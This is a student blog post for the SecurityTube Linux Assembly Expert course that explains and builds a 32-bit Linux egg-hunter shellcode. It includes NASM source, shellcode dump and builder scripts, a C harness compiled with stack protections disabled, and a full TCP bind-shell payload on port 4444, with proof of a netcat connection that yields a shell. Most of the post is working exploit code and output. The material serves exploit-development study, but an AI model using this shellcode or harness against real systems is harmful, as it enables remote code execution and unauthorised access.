# SLAE Assignment #3

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online‐courses/securitytube-linux-assembly-expert/

Student ID: SLAE-935

## Assignment

* Study about the Egg Hunter shellcode
* Create a working demo of the Egghunter
* Should be configurable for different payloads

## Resources

* http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

## Egg Hunters theory

For this assignment it's required to study the egg hunting tecniques, and come up with a fully working implementation.

Usually when a BOF happens, there isn't a lot of space available for the payload, what happens in most of cases is that a small portion of shellcode is put on the stack and directly accessible and 
another part instead is put somewhere else, and have much more space available. The egg hunting tecnique consists in a two staged payload, the first, smaller, searches for a particular pattern in memory, with which the second larger part is identified and executed. As from the paper mentioned earlier the pattern is usually 4 bytes long, and repeated twice, so that the egg-hunter won't transfer execution to its own code.

## Implementation

The shellcode used is the one for shell bind, the only change is that it will be prefixed with a short premises of 8 bytes that will be the pattern searched by the egg hunter.
Here follows the egg-hunter code:

```
; Filename: EggHunter.nasm
; Author:  SLAE-935
;
; Purpose: execute through egg-hunter routine the shellcode of ShellBindTcp

global _start			

section .text

_start:
    ; EDX = ptr address to be validated against access call and later egg
    xor edx, edx

next_page:
    ; Page alignment branch, if a EFAULT is returned from system call all the addresses
    ; in the current page are to be considered invalid, so the page is incremented,
    ; This operation is equivalent to adding 0x1000 to the value in edx
    or dx, 0xfff

next_address:

    ; access(const char *pathname, int mode)
    ; EAX = 33 = system call nbr
    ; EBX = ptr to address to be validated (egg being searched)
    ; ECX = 0 (not used in call)
    ; EDX = current ptr to in page address to be validated (not used in call)

    inc edx ; increments of 1 byte

    ; EBX = ptr to next 8 bytes (this way it allows to examine 8 bytes in a row)
    lea ebx, [edx+0x4]

    xor eax, eax ; initialize eax
    mov al, 33 ; to system call value
    int 0x80
    ; EAX = access return value (0 success, -1 error -> EFAULT)
 
    cmp al, 0xf2 ; check for EFAULT
    je next_page ; if yes, keep searching in next page
                 ; if not search egg in current memory space
    
    ; scasd
    ; EAX = DWORD first comparison operand = ABCD
    ; EDI = DWORD second operand
    mov eax, 0x41424344 ; egg tag ABCD
    mov edi, edx ; ptr to first 4 bytes
    scasd
    ; ret = set status flag, moves edi + 4 bytes

    jne next_address ; if not equal check current address + 1
                     ; if equal we check for second part of the tag

    ; scasd
    ; EAX = DWORD first comparison operand = ABCD
    ; EDI = DWORD second operand
    scasd
    ; ret = set status flag, moves edi + 4 bytes

    jne next_address ; if not equal check current address + 1
                     ; if equal we have found the egg, and jump to edi which now points
                     ; at the beginning of 2nd stage shellcode

    jmp edi ; actually edi points to the beginning of shellcode
```

Compiling the assembler code to shellcode with the following script:

```
echo '[+] Assembling with Nasm ... ' # Nasm shell source: file.nasm
nasm -f elf32 -o $1.o $1.nasm
echo '[+] Done!'

echo '[+] Linking ...'
ld -z execstack -o $1 $1.o
echo '[+] Done!'

# Remove object file
rm -rf $1.o

echo '[+] Dumping Shellcode ...'
objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\x/g'|paste -d '' -s |sed 's/^/"/' | sed 's/$/"/g'
echo '[+] Done!'

# Remove executable
rm -rf $1
```

which generates the following output (shellcode asm):

```
$ ./compile-nasm.sh egg-hunter      
[+] Assembling with Nasm ... 
[+] Done!
[+] Linking ...
[+] Done!
[+] Dumping Shellcode ...
"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x31\xc0\xb0\x21\xcd\x80\x3c\xf2\x74\xed\xb8\x44\x43\x42\x41\x89\xd7\xaf\x75\xe8\xaf\x75\xe5\xff\xe7"
[+] Done!
```

We are using the same shellcode of the previous assignment (shell bind). The following script allows easily customization of the egg payload and of the shellcode itself:

```
# Ex: ./compile.sh ABCD "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

echo '######### NASM #########'
echo '[+] Customizing Tag: '$1 # $1 Tag like: ABCD
tag=`echo -n $1 | xxd -ps | sed 's/[[:xdigit:]]\{2\}/\\\x&/g'`
echo '[+] Done!'

echo '[+] Customizing Shellcode: '$2 # $2 Shellcode: \x00\x01..
shellcode=$2
echo '[+] Done!'

echo '[+] Assemble shellcode C ...'

echo "#include<stdio.h>" >shellcode.c
echo "#include<string.h>" >>shellcode.c
echo "#define EGG \"$tag\"" >>shellcode.c
echo "unsigned char shellcode[] = EGG" >>shellcode.c
echo "                            EGG" >>shellcode.c
echo "                            \"$shellcode\";" >>shellcode.c
echo "unsigned char egghunter[] = \"\x31\xd2\x66\x81\xca\xff\x0f\x42\"" >>shellcode.c
echo "                            \"\x8d\x5a\x04\x31\xc0\xb0\x21\xcd\x80\"" >>shellcode.c
echo "                            \"\x3c\xf2\x74\xed\xb8\"" >>shellcode.c
echo "                            EGG" >>shellcode.c
echo "                            \"\x89\xd7\xaf\x75\xe8\xaf\x75\xe5\"" >>shellcode.c
echo "                            \"\xff\xe7\";" >>shellcode.c
echo "void" >>shellcode.c
echo "main() {" >>shellcode.c
echo "    printf(\"Shellcode Length: %d\\n\", strlen(egghunter));" >>shellcode.c
echo "    int (*ret)() = (int(*)())egghunter;" >>shellcode.c
echo "    ret();" >>shellcode.c
echo "}" >>shellcode.c

echo '[+] Done!'

echo '[+] Assemble shellcode.c ...'
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

The script is executed as follows:

```
$ ./compile.sh ABCD "\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x6a\x05\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51\x51\x57\x89\xe1\xcd\x80\x89\xc6\x31\xc0\xb0\x02\xcd\x80\x09\xc0\x75\x49\x31\xc0\xb0\x06\x89\xfb\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x31\xc9\xb1\x01\xfe\xc9\xcd\x80\x31\xc0\xb0\x3f\x31\xc9\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x31\xc9\xb1\x02\xcd\x80\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb1\x01\xfe\xc9\x31\xc9\x88\xca\xcd\x80\x31\xc0\xb0\x06\x89\xf3\xcd\x80\xeb\x90"
######### NASM #########
[+] Customizing Tag: ABCD
[+] Done!
[+] Customizing Shellcode: \x31\xc0\xb0\x66\x31\xdb\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x6a\x05\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51\x51\x57\x89\xe1\xcd\x80\x89\xc6\x31\xc0\xb0\x02\xcd\x80\x09\xc0\x75\x49\x31\xc0\xb0\x06\x89\xfb\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x31\xc9\xb1\x01\xfe\xc9\xcd\x80\x31\xc0\xb0\x3f\x31\xc9\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x31\xc9\xb1\x02\xcd\x80\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb1\x01\xfe\xc9\x31\xc9\x88\xca\xcd\x80\x31\xc0\xb0\x06\x89\xf3\xcd\x80\xeb\x90
[+] Done!
[+] Assemble shellcode C ...
[+] Done!
[+] Assemble shellcode.c ...
```

## Proof of execution

The executed shellcode leads to the following output that confirms it's correctness:
```
$ ./shellcode 
Shellcode Length: 36

```

and successful connection with execution of a system command into the bind shell:

```
$ nc -vv localhost 4444
Connection to localhost 4444 port [tcp/*] succeeded!
id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare),999(admin)
```